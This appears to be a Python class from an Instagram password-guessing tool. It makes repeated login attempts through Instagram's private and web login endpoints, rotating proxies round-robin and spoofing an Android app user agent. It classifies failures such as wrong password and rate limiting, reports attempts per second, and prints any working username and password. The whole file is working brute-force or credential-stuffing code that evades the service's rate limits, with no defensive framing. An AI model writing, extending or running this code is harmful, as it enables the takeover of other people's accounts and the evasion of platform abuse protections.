class InstagramEngine:
    """Handles Instagram authentication attempts via private API."""

    def __init__(self, proxy_list=None, user_agent=None):
        self.proxy_list = proxy_list or []
        self.proxy_index = 0
        self.user_agent = user_agent or (
            "Instagram 276.0.0.21.103 Android (30/11; 420dpi; 1080x1920; "
            "Samsung; SM-G991B; p3s; exynos2100; en_US; 539429394)"
        )
        self.lock = threading.Lock()
        self.attempt_count = 0
        self.start_time = None

    def _get_proxy(self):
        """Get next proxy from pool (round-robin)."""
        if not self.proxy_list:
            return None
        with self.lock:
            proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
            self.proxy_index += 1
            return proxy

    def test_login(self, username, password):
        """Attempt login with a single password. Returns (success, message)."""
        self.attempt_count += 1

        proxy = self._get_proxy()
        proxy_dict = None
        if proxy:
            proxy_dict = {'http': proxy, 'https': proxy}

        # Settings dict for the API client
        settings = {
            'user_agent': self.user_agent,
        }
        if proxy_dict:
            settings['proxy'] = proxy_dict

        if HAS_PRIVATE_API:
            try:
                client = Client(
                    username,
                    password,
                    on_login=lambda x: None,
                    settings=settings,
                )
                # If we reach here, login succeeded
                return True, f"LOGIN SUCCESSFUL: {username}:{password}"

            except ClientLoginError as e:
                # Wrong password
                error_msg = str(e)
                if "challenge_required" in error_msg:
                    return False, "CHALLENGE_REQUIRED"
                elif "Please wait" in error_msg:
                    return False, "RATE_LIMITED"
                elif "checkpoint_required" in error_msg:
                    return False, "CHECKPOINT_REQUIRED"
                elif "bad_password" in error_msg or "incorrect" in error_msg.lower():
                    return False, "WRONG_PASSWORD"
                else:
                    return False, f"LOGIN_FAILED: {error_msg[:50]}"

            except ClientThrottledError:
                return False, "THROTTLED"

            except ClientCookieExpiredError:
                return False, "COOKIE_EXPIRED"

            except ClientError as e:
                return False, f"CLIENT_ERROR: {str(e)[:50]}"

            except Exception as e:
                return False, f"ERROR: {str(e)[:50]}"
        else:
            # Fallback: Use direct requests to simulate
            return self._test_login_requests(username, password, proxy_dict)

    def _test_login_requests(self, username, password, proxy_dict):
        """Fallback login attempt using direct HTTP requests."""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'X-IG-App-ID': '936619743392459',
        })

        try:
            # Step 1: Get CSRF token
            resp = session.get(
                'https://www.instagram.com/web/__mid/',
                proxies=proxy_dict,
                timeout=15
            )

            # Step 2: Attempt login
            time_now = int(datetime.now().timestamp())
            data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }

            login_resp = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=data,
                proxies=proxy_dict,
                timeout=15,
            )

            result = login_resp.json()

            if result.get('authenticated'):
                return True, f"LOGIN SUCCESSFUL: {username}:{password}"
            elif result.get('user', False) and not result.get('authenticated'):
                return False, "WRONG_PASSWORD"
            elif 'checkpoint_url' in result:
                return False, "CHECKPOINT_REQUIRED"
            elif 'errors' in result:
                return False, f"ERROR: {result['errors']}"
            else:
                return False, f"UNKNOWN: {str(result)[:60]}"

        except requests.exceptions.ProxyError:
            return False, "PROXY_ERROR"
        except requests.exceptions.Timeout:
            return False, "TIMEOUT"
        except requests.exceptions.ConnectionError:
            return False, "CONNECTION_ERROR"
        except Exception as e:
            return False, f"REQ_ERROR: {str(e)[:50]}"

    def get_stats(self):
        """Get current attempt statistics."""
        elapsed = 0
        if self.start_time:
            elapsed = time.time() - self.start_time
        rate = 0
        if elapsed > 0:
            rate = self.attempt_count / elapsed
        return {
            'attempts': self.attempt_count,
            'elapsed': elapsed,
            'rate': rate,
        }


